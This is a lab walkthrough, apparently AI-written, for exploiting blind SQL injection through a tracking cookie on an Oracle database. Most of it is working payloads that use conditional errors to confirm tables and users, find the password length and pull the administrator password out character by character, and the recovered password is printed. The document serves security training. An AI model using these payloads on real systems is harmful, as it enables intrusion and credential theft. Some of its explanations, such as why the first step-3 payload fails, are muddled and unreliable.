# 🧪 **Lab Walkthrough: Blind SQL Injection with Conditional Errors**  
## 🔐 Lab Title: *Blind SQL injection with conditional errors*  
### 🛠️ Objective: Exploit a blind SQL injection vulnerability using **conditional errors**, extract the password of the `administrator` user, and log in as admin.

## 🎯 **Goal Recap**

- The application uses a vulnerable `TrackingId` cookie.
- SQL query runs in the backend but returns **no output**.
- If an error occurs, it shows a **custom error message**.
- Goal: Extract the password for the `administrator` user and log in.

## 🧩 Step-by-Step Breakdown (With Emoji Explanations)

## 1️⃣ **Confirm SQL Injection Vulnerability**

Start by testing basic payloads in the `TrackingId` cookie to see if SQL injection is possible.

### 📥 Payload:
```http
Cookie: TrackingId='
```

### 💡 Result:
- Triggers a **custom error** → Indicates SQL injection is possible ✅

Try a safe condition:

### 📥 Payload:
```http
Cookie: TrackingId='+OR+1=1--
```

### 💡 Result:
- No error → SQL injection exists but not always causing visible issues.

✅ **Conclusion**: Application is vulnerable to **blind SQL injection** — and may reflect database errors in custom messages. This opens the door for **error-based blind SQLi**.

## 2️⃣ **Check if `users` Table Exists**

Now we test whether the `users` table exists using Oracle syntax (based on lab behavior).

### 📥 Payload:
```http
Cookie: TrackingId='||+(SELECT+''+FROM+users+WHERE+rownum=1)+||'--
```

### 🔍 Explanation:

| Part | Meaning |
|------|---------|
| `'` | Closes original string input |
| `||` | String concatenation in Oracle |
| `(SELECT '' FROM users WHERE rownum=1)` | Attempts to select from `users` table, limited to one row |
| `+||'--` | Safely closes the rest of the SQL |

### 💡 Result:
- Query executes without error → `users` table **exists** ✅

## 3️⃣ **Confirm `administrator` User Exists**

Now we try to confirm if the `administrator` user exists using **conditional error logic**.

⚠️ You noticed this payload fails:

### ❌ Failing Payload:
```http
Cookie: TrackingId='+||+(SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM users)+||'--
```

### 🧠 Why It Fails:
SQL engines like **Oracle** process queries in this order:
1. `FROM` clause → Checks if the table exists and has rows.
2. `WHERE` clause → Filters rows.
3. `SELECT` clause → Evaluates what to return.

So even if no `administrator` user exists, the query still tries to execute because there are **other rows in the `users` table**.

➡️ This means the `CASE WHEN (username = 'administrator')` condition **might never be true**, and **no error is triggered**.

### ✅ Fixed Payload:
```http
Cookie: TrackingId='+||+(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')+||'--
```

### 🔍 Explanation:

| Part | Meaning |
|------|---------|
| `WHERE username='administrator'` | Ensures only the admin user is selected |
| `CASE WHEN (1=1)` | Always true for matching rows |
| `THEN TO_CHAR(1/0)` | Forces divide-by-zero error |
| `ELSE ''` | Safe result if no match found |

### 💡 Result:
- Error occurred → `administrator` user **exists** ✅

This way, the error only triggers **if the WHERE condition matches**.

## 4️⃣ **Determine Password Length**

Now find out how long the password is.

### 📥 Payload:
```http
Cookie: TrackingId='+||+(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20)+||'--
```

🔁 Use **Burp Intruder** to vary the value of `LENGTH(password)` from `1` to `30`.

### 💡 Result:
- When `LENGTH(password)=20` → Error occurs ✅  
➡️ The password has **20 characters**

## 5️⃣ **Extract Password Character by Character**

Now we extract each character using `SUBSTR()` and induce errors when the guessed character matches.

### 📥 Payload:
```http
Cookie: TrackingId='+||+(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')+||'--
```

🔁 Use **Burp Intruder**:
- Target position: `'a'`
- Attack type: **Cluster bomb**
- Payload set: All possible characters (`a-z`, `A-Z`, `0-9`, etc.)

Repeat for positions `1` through `20`.

## 6️⃣ **Reconstructed Password**

After running Burp Intruder for all 20 positions:

### 🔐 Final Password:
```plaintext
1y1vysmt4233aiwpt6xw
```

Each character was confirmed by triggering an error only when the guessed value matched the real one.

## 7️⃣ **Log In as Administrator**

Go to `/login` and enter:

- **Username:** `administrator`
- **Password:** `1y1vysmt4233xxxxxxxxxxx`

🔐 **Logged in successfully! Lab solved.**

## 🧾 Summary of Key Queries

| Purpose | Payload |
|--------|---------|
| Confirm SQLi | `'` |
| Check `users` table | `'||+(SELECT+''+FROM+users+WHERE+rownum=1)+||'--` |
| Confirm `administrator` exists | `'+||+(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')+||'--` |
| Find password length | `'+||+(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20)+||'--` |
| Extract password char by char | `'+||+(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')+||'--` |

## 🧠 Takeaways

- Even with **no visible output**, you can infer data via **conditional errors**.
- Use `CASE WHEN ... THEN 1/0` to force errors based on conditions.
- Oracle requires special handling like `TO_CHAR(1/0)` due to strict syntax.
- Burp Intruder is your best friend for brute-forcing character-by-character.
- Always close queries safely using `--` or `/* */` to avoid parsing issues.

## 🎉 Final Notes

Great job solving this challenging lab! You've demonstrated mastery of **error-based blind SQL injection**, including:
- Enumerating database structure
- Inferring data without output
- Automating extraction with Burp Intruder

Let me know what you'd like to tackle next! 💥

<!-- ** Admin Password:** `1y1vysmt4233aiwpt6xw` -->